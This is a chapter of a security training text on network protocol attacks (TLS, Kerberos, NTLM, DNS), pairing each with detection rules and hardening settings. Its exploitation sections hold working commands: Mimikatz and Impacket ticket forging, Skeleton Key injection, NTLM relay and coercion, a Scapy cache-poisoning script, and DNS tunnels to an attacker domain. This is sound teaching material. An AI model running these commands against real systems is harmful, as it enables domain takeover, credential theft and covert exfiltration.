# Domain 13, Chapter 13B — Protocol Attacks

> **Scope.** Key exchange attacks (DH small subgroup, Logjam, FREAK). TLS protocol attacks (ROBOT, DROWN, POODLE, BEAST, Lucky13, SWEET32, Raccoon, ALPACA). DNS attacks (cache poisoning/Kaminsky, rebinding, tunneling, amplification, DNSSEC bypass, DoH/DoT evasion). ARP attacks (spoofing, cache poisoning, GARP). BGP attacks (prefix hijacking, AS-path manipulation, route leaks, RPKI/ROA, BGP Flowspec). DHCP attacks (starvation, rogue server). NTP attacks (amplification, Delorean, NTS). LDAP injection. SMTP attacks (relay abuse, SPF/DKIM/DMARC bypass, STARTTLS stripping). SSH attacks (downgrade, Terrapin CVE-2023-48795, key harvesting). HTTP/2 and HTTP/3 attacks (HPACK bomb, rapid reset CVE-2023-44487, QUIC abuse). VLAN attacks (hopping, double tagging, DTP, private VLAN bypass). 802.1X bypass (MAB, RADIUS relay, EAP downgrade). Kerberos (Golden/Silver/Diamond/Sapphire Ticket, Skeleton Key, S4U2Self/S4U2Proxy, Kerberoasting, AS-REP Roasting). NTLM relay (SMB/LDAP signing, EPA bypass, PrinterBug, PetitPotam). Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash.

---

## 1. Key exchange attacks

### 1.1 Diffie-Hellman problems

**Small subgroup confinement.** If the DH group is not a safe prime (p = 2q + 1 with q prime), the group may contain small subgroups. An attacker who sends a group element of small order as their DH public key confines the shared secret to the small subgroup, dramatically reducing the search space. Defense: validate that the received public key is in the correct subgroup (raise to the subgroup order and verify the result is the identity), or use safe primes / standardized groups.

**Logjam (CVE-2015-4000).** TLS servers that support export-grade DHE (512-bit groups) can be downgraded by an active MitM who modifies the ClientHello to request export ciphers. The attacker precomputes the discrete logarithm for common 512-bit groups (feasible with academic resources — approximately one week of computation per group, amortized across all connections using that group). With the discrete log, the attacker derives the shared secret and decrypts the session. Additional finding: many servers used the same 1024-bit DH group, making nation-state-level precomputation (estimated at hundreds of millions of dollars) a concern.

**Exploitation.**

```bash
# Detect Logjam-vulnerable servers with nmap
nmap --script ssl-dh-params -p 443 target.com

# Test for export ciphers with openssl
openssl s_client -connect target.com:443 -cipher EXPORT

# Enumerate DH parameters in use
openssl s_client -connect target.com:443 -msg 2>&1 | grep "Server Temp Key"
```

**Detection.**

Suricata rule for export cipher negotiation:
```
alert tls any any -> any any (msg:"TLS Export Cipher Suite Negotiation Detected"; \
  tls.ciphersuite:0x0003; tls.ciphersuite:0x0006; tls.ciphersuite:0x0008; \
  tls.ciphersuite:0x000B; classtype:policy-violation; \
  reference:cve,2015-4000; rev:1;)
```

Zeek detection:
```zeek
event ssl_extension(c: connection, is_client: bool, code: count, val: string) {
    if ( is_client && code == 0x000a ) {
        # Check for weak named groups in supported_groups extension
        # Group IDs: 0x0001 (sect163k1), 0x0016 (sect233k1) are weak
        if ( /\x00\x01/ in val || /\x00\x16/ in val )
            NOTICE([$note=SSL::Weak_DH_Group,
                    $msg=fmt("Weak DH group offered by %s", c$id$orig_h),
                    $conn=c]);
    }
}
```

**Hardening.**

```
# OpenSSL — generate strong DH parameters (2048-bit minimum, 4096 preferred)
openssl dhparam -out /etc/ssl/dhparams.pem 4096

# Nginx — disable export ciphers and enforce strong DH
ssl_dhparam /etc/ssl/dhparams.pem;
ssl_ciphers 'ECDHE+AESGCM:DHE+AESGCM:!EXPORT:!DES:!RC4:!3DES:!aNULL:!eNULL';
ssl_protocols TLSv1.2 TLSv1.3;

# Apache — enforce TLS 1.2+ and strong ciphers
SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite ECDHE+AESGCM:DHE+AESGCM:!EXPORT:!NULL
SSLOpenSSLConfCmd DHParameters "/etc/ssl/dhparams.pem"
```

### 1.2 FREAK (CVE-2015-0204)

Factoring RSA Export Keys. An active MitM downgrades the connection to export-grade RSA (512-bit RSA keys), factors the key in hours, and decrypts the session. Affected servers that supported export RSA cipher suites alongside modern ones.

**Exploitation.**

```bash
# Test for FREAK vulnerability
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i export

# openssl test for RSA export ciphers
openssl s_client -connect target.com:443 -cipher EXPORT
openssl s_client -connect target.com:443 -cipher EXP-RC4-MD5
```

**Hardening.** Remove all EXPORT cipher suites from TLS configuration. Upgrade to TLS 1.2+ which does not define export suites.

---

## 2. TLS protocol attacks

### 2.1 Named attacks

**ROBOT (Return of Bleichenbacher's Oracle, 2017).** Bleichenbacher's 1998 RSA PKCS#1 v1.5 padding oracle rediscovered in modern TLS implementations. Affected Facebook, Cisco ACE, F5 BIG-IP, and others. The oracle was subtle: different error messages, different timing, or different TLS alert codes for valid vs invalid padding. Defense: remove RSA key exchange (TLS 1.3 does this), or implement constant-time decryption with random fallback.

**Exploitation.**

```bash
# ROBOT scanner
git clone https://github.com/robotattackorg/robot-detect
python3 robot-detect/robot-detect.py -p 443 target.com

# testssl.sh comprehensive check
testssl.sh --robot target.com:443
```

**DROWN (CVE-2016-0800).** An SSLv2-based attack that decrypts TLS sessions. If the server (or any server sharing the same RSA private key) supports SSLv2, the attacker can use SSLv2's weaker cryptography to recover the RSA session key, then decrypt a TLS session that used the same RSA key. Defense: disable SSLv2 everywhere, and do not share RSA keys across services.

**Detection.**

```bash
# Test for SSLv2 support
nmap --script sslv2 -p 443 target.com
openssl s_client -connect target.com:443 -ssl2

# testssl.sh
testssl.sh --drown target.com:443
```

Suricata rule for SSLv2 negotiation:
```
alert tls any any -> any any (msg:"SSLv2 Client Hello Detected - DROWN Risk"; \
  tls.version:!TLS1.0; tls.version:!TLS1.1; tls.version:!TLS1.2; tls.version:!TLS1.3; \
  flow:established,to_server; classtype:policy-violation; \
  reference:cve,2016-0800; rev:1;)
```

**POODLE (CVE-2014-3566).** Padding Oracle On Downgraded Legacy Encryption. An active MitM downgrades the connection to SSL 3.0 (which uses CBC with a vulnerable padding scheme), then exploits the padding oracle to decrypt HTTP cookies byte-by-byte. The SSL 3.0 padding is non-deterministic (any padding value is accepted), which paradoxically creates a padding oracle (the attacker can detect when the last byte of a block happens to equal the expected padding value).

**Exploitation.**

```bash
# Test for SSL 3.0 support
nmap --script ssl-poodle -p 443 target.com
openssl s_client -connect target.com:443 -ssl3

# POODLE exploit PoC (requires MitM position)
# The attacker needs to inject JavaScript to generate requests
# and manipulate CBC block boundaries
```

**BEAST (CVE-2011-3389).** TLS 1.0 uses a predictable IV for CBC (the last ciphertext block of the previous record is the IV for the next). An attacker who can inject chosen plaintext (via JavaScript in the victim's browser) can perform a blockwise chosen-plaintext attack to decrypt one byte per request. Defense: TLS 1.1+ uses random IVs; the 1/n-1 record-splitting workaround mitigates BEAST on TLS 1.0.

**SWEET32 (CVE-2016-2183).** Birthday attack on 64-bit block ciphers (3DES, Blowfish) in CBC mode. After 2^32 blocks (approximately 32 GB of data), a collision in the ciphertext blocks leaks the XOR of two plaintext blocks. In long-lived TLS sessions (HTTP/1.1 keep-alive), this is achievable. Defense: avoid 64-bit block ciphers (use AES).

**Raccoon (CVE-2020-1968).** A timing side channel in the DH key exchange: the leading bytes of the shared secret (after DH computation) vary in length depending on the inputs. If the server reuses DH keys across sessions, the attacker can observe the timing of the key derivation (which processes a variable-length shared secret) and, over many sessions, recover the shared secret. Defense: use ephemeral DH (ECDHE, fresh keys per session — already mandatory in TLS 1.3).

**ALPACA (CVE-2021-3449 and related).** Application-Layer Protocol Content Confusion Attack. If a TLS server hosts multiple application-layer protocols (HTTPS, FTPS, SMTPS) on different ports but using the same certificate, an active MitM can redirect a TLS connection intended for HTTPS to the FTPS port. The TLS handshake succeeds (same certificate), but the application-layer protocol is different. The FTPS server may reflect attacker-controlled input in its responses, which the browser interprets as HTTP — enabling XSS or cookie theft.

**Comprehensive TLS hardening.**

```bash
# Test entire TLS stack
testssl.sh --full target.com:443

# Mozilla SSL Configuration Generator — use the "Modern" profile
# Targets TLS 1.3 only for highest security, or "Intermediate" for TLS 1.2+

# Nginx modern profile
ssl_protocols TLSv1.3;
ssl_prefer_server_ciphers off;

# Nginx intermediate profile
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;

# Apache
SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
SSLHonorCipherOrder off
```

---

## 3. Routing and naming security

### 3.1 RPKI and BGPsec

**RPKI (Resource Public Key Infrastructure).** A hierarchical PKI that binds IP address prefixes to the autonomous systems (ASes) authorized to originate them. ROAs (Route Origin Authorizations) are signed objects stating "AS X is authorized to originate prefix Y/Z." Relying-party validators (like `rpki-client`, `Routinator`, `OctoRPKI`) fetch and validate ROAs, producing a list of valid prefix-to-AS mappings that routers use to filter BGP announcements.

RPKI prevents route hijacking (an unauthorized AS announcing another's prefix) but does not prevent path manipulation (an AS announcing a valid prefix with a forged path). **BGPsec** adds path validation (each AS in the path signs its contribution), but BGPsec adoption is minimal due to performance and deployment challenges.

### 3.2 DNSSEC attacks

Covered in Domain 9, Chapter 9A §2.4. NSEC zone walking enumerates all names. Algorithm downgrade strips strong signatures. DANE/TLSA binds TLS certificates to DNSSEC-signed DNS records but depends on DNSSEC validation at the client.

---

## 4. Kerberos attacks

### 4.1 Architecture

Kerberos authentication: the client authenticates to the KDC (Key Distribution Center) and receives a TGT (Ticket-Granting Ticket), encrypted with the KRBTGT account's hash. The client presents the TGT to the KDC's TGS (Ticket-Granting Service) to obtain service tickets for specific services. Service tickets are encrypted with the target service account's hash. The service validates the ticket by decrypting it with its own key.

### 4.2 Ticket forging

**Golden Ticket.** If the attacker has the KRBTGT account's NTLM hash (obtainable by compromising a domain controller and extracting `NTDS.DIT`, or via DCSync with replication privileges), they can forge TGTs for any user, with any group membership, and any lifetime. The forged TGT is indistinguishable from a legitimate one because it is encrypted with the real KRBTGT key. Persistence: the KRBTGT hash rarely changes (it requires a double-rotation — two consecutive password changes — to fully invalidate), so a stolen hash provides long-term access.

**Exploitation.**

```
# Mimikatz — forge Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX /krbtgt:NTLM_HASH_HERE \
  /id:500 /groups:512,519,520 /ptt

# Impacket — ticketer
impacket-ticketer -nthash NTLM_HASH_HERE -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@dc01.domain.local -k -no-pass
```

Detection: TGTs with abnormally long lifetimes, TGTs for non-existent users, TGTs issued without corresponding AS-REQ events in the KDC's logs, and PAC (Privilege Attribute Certificate) validation failures at the service.

**Silver Ticket.** The attacker has a service account's NTLM hash and forges a service ticket directly, bypassing the KDC entirely. The forged ticket grants access to the specific service. Silver Tickets are harder to detect than Golden Tickets because they never touch the KDC (no TGS-REQ in the logs).

**Exploitation.**

```
# Mimikatz — forge Silver Ticket for CIFS on file server
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX /target:fileserver.domain.local \
  /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Impacket
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain domain.local -spn cifs/fileserver.domain.local Administrator
```

Detection: service tickets without corresponding TGS-REQ events, tickets with anomalous PAC contents, and periodic service-account password rotation (which invalidates forged tickets).

**Diamond Ticket.** The attacker requests a legitimate TGT from the KDC (via a normal AS-REQ), then decrypts it (using the KRBTGT hash), modifies the PAC (adding privileged group memberships), re-encrypts it, and uses it. The result looks like a legitimate TGT (it was issued by the KDC) but with elevated privileges. Harder to detect than a Golden Ticket because the TGT has a corresponding AS-REQ in the logs.

**Exploitation.**

```
# Rubeus — Diamond Ticket
Rubeus.exe diamond /krbkey:AES256_KRBTGT_KEY /user:lowprivuser \
  /password:Password1 /enctype:aes /ticketuser:Administrator \
  /ticketuserid:500 /groups:512 /ptt
```

**Sapphire Ticket.** Similar to Diamond, but the attacker uses S4U2Self to obtain a legitimate service ticket for a privileged user, then modifies it. Combines legitimate Kerberos protocol flows with PAC manipulation.

**Skeleton Key.** The attacker patches LSASS on the domain controller to accept a master password for any account (in addition to the real password). After patching, the attacker can authenticate as any user with the skeleton key password. The real passwords continue to work, so users don't notice. Detection: LSASS memory integrity monitoring, unexpected LSASS patches, and periodic domain controller reboots (which clear the in-memory patch).

**Exploitation.**

```
# Mimikatz — inject Skeleton Key (default password: "mimikatz")
privilege::debug
misc::skeleton

# After injection, authenticate as any user with "mimikatz" as password
net use \\dc01\C$ /user:domain\Administrator mimikatz
```

### 4.3 Delegation abuse

**S4U2Self** (Service for User to Self): a service can request a ticket to itself on behalf of any user. This produces a forged service ticket for the specified user — useful for accessing the service as that user.

**S4U2Proxy** (Service for User to Proxy): a service can present a user's ticket and request a ticket to another service on the user's behalf (constrained delegation). If the delegation is misconfigured (the service is trusted for delegation to a sensitive service like CIFS on the DC), the attacker can impersonate any user to the sensitive service.

**Unconstrained delegation**: the service receives the user's TGT (not just a service ticket) and can use it to access any service as the user. A compromised server with unconstrained delegation can impersonate any user who connects to it.

**Exploitation.**

```
# Find unconstrained delegation (PowerView)
Get-DomainComputer -Unconstrained -Properties samaccountname,dnshostname

# Find constrained delegation
Get-DomainComputer -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto

# Impacket — S4U2Self + S4U2Proxy abuse
impacket-getST -spn cifs/dc01.domain.local -impersonate Administrator \
  domain.local/compromised_svc:Password1 -dc-ip 10.0.0.1
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@dc01.domain.local -k -no-pass

# Rubeus — constrained delegation abuse
Rubeus.exe s4u /user:compromised_svc /rc4:HASH \
  /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /ptt
```

### 4.4 Kerberoasting and AS-REP Roasting

**Kerberoasting.** Any authenticated domain user can request a service ticket for any SPN (Service Principal Name) in the domain. The service ticket is encrypted with the service account's NTLM hash. The attacker requests tickets for service accounts, then cracks the ticket encryption offline (brute-force or dictionary attack on the NTLM hash). Service accounts with weak passwords are vulnerable. Detection: high volume of TGS-REQ for SPNs from a single user, especially for SPNs that the user doesn't normally access.

**AS-REP Roasting.** Accounts configured with "Do not require Kerberos preauthentication" allow anyone to request an AS-REP (the KDC's response to an AS-REQ), which contains data encrypted with the user's hash. The attacker cracks this offline. Detection: accounts with preauthentication disabled (audit this configuration).

**See Domain 14, Chapter 14A §1.1–1.2 for exhaustive enumeration, exploitation, detection (Sigma/KQL), and hardening procedures for both attacks.**

### 4.5 Generic Kerberos implementation flaws

**Etype downgrade.** The AS-REQ includes a list of supported encryption types. If RC4-HMAC (etype 23) is still enabled, the client can request RC4 even when AES is preferred. RC4 uses the raw NTLM hash as the key — trivially faster to crack than AES-256 with PBKDF2 (4096 iterations). Attackers deliberately request RC4 tickets during Kerberoasting and AS-REP Roasting to reduce offline cracking time.

**Ticket replay.** Kerberos tickets are bearer tokens. A stolen ticket can be reused until expiration. The AP-REQ includes a replay cache (authenticator timestamp + client principal must be unique within the skew window), but a stolen TGT can be presented to the KDC for new service tickets without restriction.

**Clock skew exploitation.** Kerberos requires clocks to be within 5 minutes (default MaxClockSkew). Manipulating a client's time (via NTP attacks — see §10) can cause authentication failures or create windows where replay detection fails.

---

## 5. NTLM relay and pass-the-hash

### 5.1 NTLM relay

NTLM authentication is a challenge-response protocol. In a relay attack, the attacker positions as a MitM: the victim authenticates to the attacker (who impersonates a legitimate service), and the attacker forwards the authentication to the real target service, authenticating as the victim.

**SMB signing.** If SMB signing is not required, the attacker can relay NTLM authentication from an SMB connection to another SMB server. With required SMB signing, the relay fails because the attacker cannot sign SMB packets (they don't have the session key derived from the NTLM exchange). Default: SMB signing is required on domain controllers, optional on other servers and workstations.

**LDAP signing and channel binding.** LDAP relay is mitigated by LDAP signing (integrity protection) and LDAP channel binding (EPA — Extended Protection for Authentication, which binds the NTLM session to the TLS channel). Without these, an attacker can relay NTLM to LDAP and perform directory modifications (add a computer account, modify group membership, set up resource-based constrained delegation).

**PrinterBug (SpoolService).** The Print Spooler service on Windows can be triggered (via `RpcRemoteFindFirstPrinterChangeNotificationEx`) to authenticate back to the attacker's server using NTLM. The attacker triggers this from one server, captures the NTLM authentication, and relays it to another service. **PetitPotam** (CVE-2021-36942): the EFS (Encrypting File System) RPC interface can similarly be triggered to authenticate to the attacker.

**Exploitation.**

```bash
# Responder — capture NTLM hashes on the network
sudo responder -I eth0 -wrfv

# ntlmrelayx — relay captured auth to target
impacket-ntlmrelayx -t smb://10.0.0.5 -smb2support

# ntlmrelayx — relay to LDAP and add computer account for RBCD
impacket-ntlmrelayx -t ldaps://dc01.domain.local --add-computer FAKEMACHINE\$ --delegate-access

# Trigger PrinterBug
python3 printerbug.py domain.local/user:pass@10.0.0.1 attacker_ip

# Trigger PetitPotam
python3 petitpotam.py attacker_ip 10.0.0.1

# Relay coerced auth to ADCS web enrollment for certificate theft
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp \
  --adcs --template DomainController
```

**Detection.**

Suricata rules for NTLM relay indicators:
```
alert smb any any -> any any (msg:"SMB NTLM Relay - Type 2 Challenge Forwarded"; \
  content:"|4e 54 4c 4d 53 53 50 00 02 00 00 00|"; offset:0; depth:12; \
  flow:established; classtype:attempted-admin; rev:1;)
```

Wireshark filters:
```
# Capture NTLM authentication traffic
ntlmssp
ntlmssp.messagetype == 0x00000003  # NTLM Auth message (Type 3)

# SMB without signing
smb2.flags.signed == 0
```

### 5.2 Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash

**Pass-the-Hash (PtH).** NTLM authentication uses the NTLM hash (MD4 of the Unicode password) as the key for the challenge-response computation. An attacker who has the hash (from LSASS memory, from SAM, from NTDS.DIT) can authenticate as the user without knowing the plaintext password — by directly using the hash in the NTLM computation.

**Exploitation.**

```bash
# Impacket — PtH via various protocols
impacket-psexec -hashes :NTLM_HASH domain.local/Administrator@10.0.0.5
impacket-wmiexec -hashes :NTLM_HASH domain.local/Administrator@10.0.0.5
impacket-smbexec -hashes :NTLM_HASH domain.local/Administrator@10.0.0.5

# CrackMapExec — spray PtH across hosts
crackmapexec smb 10.0.0.0/24 -u Administrator -H NTLM_HASH

# Mimikatz — PtH
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd
```

**Pass-the-Ticket (PtT).** The attacker uses a stolen Kerberos ticket (TGT or service ticket) to authenticate. The ticket is a self-contained credential — presenting it to a service (or to the KDC) grants access without needing the password or hash.

**Overpass-the-Hash.** The attacker uses the NTLM hash to request a Kerberos TGT (via the AS-REQ, where the encrypted timestamp is computed using the hash as the key). The result is a legitimate Kerberos TGT obtained from the NTLM hash — "overpass" because the attacker goes from NTLM credential to Kerberos credential. The TGT is then used for Kerberos-based lateral movement, bypassing NTLM-specific detections.

Detection: correlating authentication events across protocols (a PtH produces an NTLM logon event without a preceding interactive logon; an Overpass-the-Hash produces an AS-REQ from a workstation that doesn't normally request TGTs for that user). Monitoring for LSASS access (Sysmon Event ID 10 with `GrantedAccess` matching credential-dumping patterns).

---

## 6. DNS attacks

### 6.1 DNS cache poisoning — Kaminsky attack

**Mechanism.** The classic DNS cache poisoning attack exploits the structure of recursive DNS resolution. When a recursive resolver receives a query for a name it doesn't have cached, it sends a query to the authoritative nameserver. The DNS Transaction ID (TXID) is a 16-bit field (65,536 possible values). The resolver accepts the first response with a matching TXID, query name, and source port.

Dan Kaminsky's 2008 breakthrough eliminated the requirement to wait for cached entries to expire. Instead of targeting a cached domain (which requires waiting for TTL expiry), the attacker queries for random, non-existent subdomains (e.g., `aaaa.target.com`, `aaab.target.com`). Each query triggers a fresh recursive lookup. The attacker then floods the resolver with forged responses containing:

1. A matching TXID (brute-forced — the attacker sends hundreds of responses with different TXIDs)
2. The correct query name (the random subdomain)
3. A malicious **authority section** with a glue record delegating `target.com` to the attacker's nameserver

The birthday paradox does not directly apply to TXID guessing (the attacker must match a specific TXID), but it reduces the expected number of attempts when source port randomization is absent. With unrandomized source port (always port 53), the attacker needs to match only the 16-bit TXID — approximately 2^16 = 65,536 attempts per query window. The race window is the RTT between the resolver and the real authoritative server (typically 10-100ms), during which the attacker must land a forged response.

**Bailiwick check bypass.** DNS resolvers implement bailiwick checks: a response for `aaaa.target.com` should only contain authority records within `.target.com`, not for `.com` or unrelated zones. Kaminsky's attack stays within bailiwick by forging delegation records for `target.com` itself within a response for a subdomain of `target.com`.

**Exploitation.**

```python
#!/usr/bin/env python3
"""Kaminsky-style DNS cache poisoning — educational PoC using Scapy."""
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import random, string

RESOLVER = "10.0.0.53"        # Target recursive resolver
ATTACKER_NS = "evil.attacker.com"
TARGET_DOMAIN = "target.com"

def random_subdomain():
    prefix = ''.join(random.choices(string.ascii_lowercase, k=8))
    return f"{prefix}.{TARGET_DOMAIN}"

for attempt in range(1000):
    subdomain = random_subdomain()
    # Send legitimate query to resolver to trigger recursion
    query = IP(dst=RESOLVER)/UDP(dport=53)/DNS(
        rd=1, qd=DNSQR(qname=subdomain))
    send(query, verbose=0)

    # Flood forged responses (race the real authoritative response)
    for txid in range(0, 65536, 256):  # Sample TXID space
        forged = IP(src="1.2.3.4", dst=RESOLVER)/UDP(sport=53, dport=random.randint(1024,65535))/DNS(
            id=txid, qr=1, aa=1, qd=DNSQR(qname=subdomain),
            an=DNSRR(rrname=subdomain, rdata="6.6.6.6"),
            ns=DNSRR(rrname=TARGET_DOMAIN, type="NS", rdata=ATTACKER_NS),
            ar=DNSRR(rrname=ATTACKER_NS, type="A", rdata="6.6.6.6"))
        send(forged, verbose=0)
```

**Detection.**

Suricata rules:
```
alert dns any any -> any 53 (msg:"DNS Cache Poisoning - High Volume Responses to Resolver"; \
  flow:to_server; dns.opcode:0; threshold:type both, track by_dst, count 100, seconds 1; \
  classtype:attempted-admin; rev:1;)

alert dns any 53 -> any any (msg:"DNS Response with Mismatched Authority Glue Record"; \
  flow:to_client; dns.opcode:0; dns.flags:QR; \
  content:"|00 02|"; content:"|00 01|"; distance:0; within:20; \
  classtype:attempted-admin; rev:1;)
```

Zeek script for anomalous DNS response volume:
```zeek
@load base/frameworks/notice

module DNSPoisoning;

export {
    redef enum Notice::Type += { DNS_Poisoning_Attempt };
    global response_count: table[addr] of count &default=0 &create_expire=5sec;
}

event dns_message(c: connection, is_orig: bool, msg: dns_msg, len: count) {
    if ( ! is_orig && msg$QR ) {
        response_count[c$id$orig_h] += 1;
        if ( response_count[c$id$orig_h] > 50 )
            NOTICE([$note=DNS_Poisoning_Attempt,
                    $msg=fmt("Excessive DNS responses to resolver %s: %d in 5s",
                             c$id$orig_h, response_count[c$id$orig_h]),
                    $conn=c]);
    }
}
```

Wireshark filter:
```
dns.flags.response == 1 && dns.count.auth_rr > 0 && dns.resp.type == 2
```

**Hardening.**

```bash
# BIND — enable source port randomization (default since BIND 9.5+)
# Verify in named.conf:
options {
    use-v4-udp-ports { range 1024 65535; };
    use-v6-udp-ports { range 1024 65535; };
};

# Unbound — source port randomization (enabled by default)
# Verify:
server:
    outgoing-range: 8192
    num-queries-per-thread: 4096

# DNSSEC validation (strongest defense — eliminates unsigned cache poisoning)
# BIND
dnssec-validation auto;

# Unbound
server:
    auto-trust-anchor-file: "/var/lib/unbound/root.key"
    val-log-level: 1

# Linux iptables — rate-limit DNS responses to resolver
iptables -A INPUT -p udp --sport 53 -m recent --name DNS_RESP \
  --set --rsource
iptables -A INPUT -p udp --sport 53 -m recent --name DNS_RESP \
  --update --seconds 1 --hitcount 100 --rsource -j DROP
```

**CVEs.** CVE-2008-1447 (original Kaminsky vulnerability). All major resolver implementations were affected: BIND, Unbound, Microsoft DNS, dnsmasq, PowerDNS Recursor. Patches added source port randomization, increasing the brute-force space from 2^16 to approximately 2^32.

### 6.2 DNS rebinding

**Mechanism.** DNS rebinding exploits the gap between DNS resolution and the browser's same-origin policy. The attacker controls `evil.com` and its authoritative DNS. The attack flow:

1. Victim visits `evil.com`, which resolves to the attacker's server (e.g., `5.5.5.5`) with a very short TTL (e.g., 1 second)
2. The attacker's page loads JavaScript that, after the TTL expires, makes a new request to `evil.com`
3. The attacker's DNS now responds with `192.168.1.1` (the victim's internal router/service)
4. The browser considers this same-origin (still `evil.com`) and allows the JavaScript to read the response
5. The attacker exfiltrates data from the internal service via the JavaScript

This bypasses firewall rules because the browser — inside the trusted network — makes the connection to the internal IP.

**Exploitation.**

```bash
# Singularity of Origin — automated DNS rebinding framework
git clone https://github.com/nccgroup/singularity
cd singularity
go build -o singularity ./cmd/singularity-server
./singularity -HTTPServerPort 8080 -DNSRebindingStrategy round-robin \
  -ResponseIPAddr 5.5.5.5 -ResponseReboundIPAddr 192.168.1.1

# rbndr.us — simple DNS rebinding service
# Configure A records to alternate between attacker IP and target IP
# Access via: http://7f000001.05050505.rbndr.us (resolves to 127.0.0.1 then 5.5.5.5)

# Manual Scapy DNS server for rebinding
python3 -c "
from scapy.all import *
import time

first_request = True
def dns_reply(pkt):
    global first_request
    if DNS in pkt and pkt[DNS].opcode == 0:
        if first_request:
            rdata = '5.5.5.5'  # Attacker IP first
            first_request = False
        else:
            rdata = '192.168.1.1'  # Internal target
        resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(
            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=1, rdata=rdata))
        send(resp, verbose=0)

sniff(filter='udp port 53', prn=dns_reply)
"
```

**Detection.**

```
# Zeek — detect DNS responses with private IP addresses from external domains
event dns_A_reply(c: connection, msg: dns_msg, ans: dns_answer, a: addr) {
    if ( Site::is_private_addr(a) && ! Site::is_local_name(ans$query) )
        NOTICE([$note=DNS::External_Domain_Internal_IP,
                $msg=fmt("External domain %s resolved to internal IP %s",
                         ans$query, a),
                $conn=c]);
}
```

**Hardening.**

```bash
# dnsmasq — block private IP responses from upstream resolvers
stop-dns-rebind
rebind-localhost-ok  # Allow if needed for development

# Unbound — private address blocking
server:
    private-address: 10.0.0.0/8
    private-address: 172.16.0.0/12
    private-address: 192.168.0.0/16
    private-address: 169.254.0.0/16
    private-address: fd00::/8
    private-address: fe80::/10

# Browser-level: browsers now implement DNS rebinding protections
# but defense-in-depth at the resolver level is required
```

### 6.3 DNS tunneling

**Mechanism.** DNS tunneling encodes arbitrary data in DNS queries and responses to exfiltrate data or establish command-and-control channels through networks that allow DNS traffic but block other protocols. Data is encoded in subdomain labels (queries) and TXT/CNAME/MX/NULL records (responses). Typical encoding: base32 or base64 in subdomain labels (limited to 63 bytes per label, 253 bytes total per FQDN). Throughput: 10-500 kbps depending on encoding and DNS infrastructure.

**Exploitation.**

```bash
# iodine — IP-over-DNS tunnel
# Server (attacker, authoritative NS for tunnel.attacker.com)
iodined -f -c -P secretpassword 10.0.0.1/24 tunnel.attacker.com

# Client (victim network)
iodine -f -P secretpassword tunnel.attacker.com
# Creates a tun0 interface — full IP connectivity over DNS

# dnscat2 — encrypted C2 over DNS
# Server
ruby dnscat2.rb tunnel.attacker.com --secret=secretkey

# Client
./dnscat --secret=secretkey tunnel.attacker.com

# dns2tcp — TCP over DNS
# Server config (/etc/dns2tcpd.conf)
cat << 'CONF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /tmp
domain = tunnel.attacker.com
resources:
  ssh:127.0.0.1:22
  http:127.0.0.1:80
CONF
dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf

# Client
dns2tcpc -r ssh -z tunnel.attacker.com target_dns_server
ssh -o ProxyCommand="dns2tcpc -r ssh -z tunnel.attacker.com %h" user@127.0.0.1
```

**Detection — entropy analysis.**

DNS tunneling produces queries with significantly higher entropy than normal DNS traffic. Normal domain labels have entropy ~3.5-4.0 bits/char; tunneling labels have entropy ~4.5-5.0+ bits/char.

```python
#!/usr/bin/env python3
"""Detect DNS tunneling via Shannon entropy analysis."""
import math
from collections import Counter

def shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    freq = Counter(data)
    length = len(data)
    return -sum((count/length) * math.log2(count/length) for count in freq.values())

def analyze_query(qname: str) -> dict:
    labels = qname.rstrip('.').split('.')
    # Analyze the subdomain portion (exclude TLD and registered domain)
    subdomain = '.'.join(labels[:-2]) if len(labels) > 2 else labels[0]
    entropy = shannon_entropy(subdomain)
    label_lengths = [len(l) for l in labels[:-2]]
    avg_label_len = sum(label_lengths) / max(len(label_lengths), 1)

    suspicious = (
        entropy > 4.2 or
        avg_label_len > 20 or
        len(subdomain) > 50 or
        len(labels) > 6
    )
    return {"qname": qname, "entropy": entropy, "avg_label_len": avg_label_len,
            "suspicious": suspicious}

# Example
print(analyze_query("aGVsbG8gd29ybGQ.dHVubmVs.attacker.com"))  # Tunneling
print(analyze_query("www.google.com"))                           # Normal
```

Suricata rules:
```
alert dns any any -> any 53 (msg:"DNS Tunneling - Excessively Long Subdomain"; \
  dns.query; content:"."; offset:50; \
  classtype:policy-violation; rev:1;)

alert dns any any -> any 53 (msg:"DNS Tunneling - High Query Volume to Single Domain"; \
  dns.query; threshold:type both, track by_src, count 500, seconds 60; \
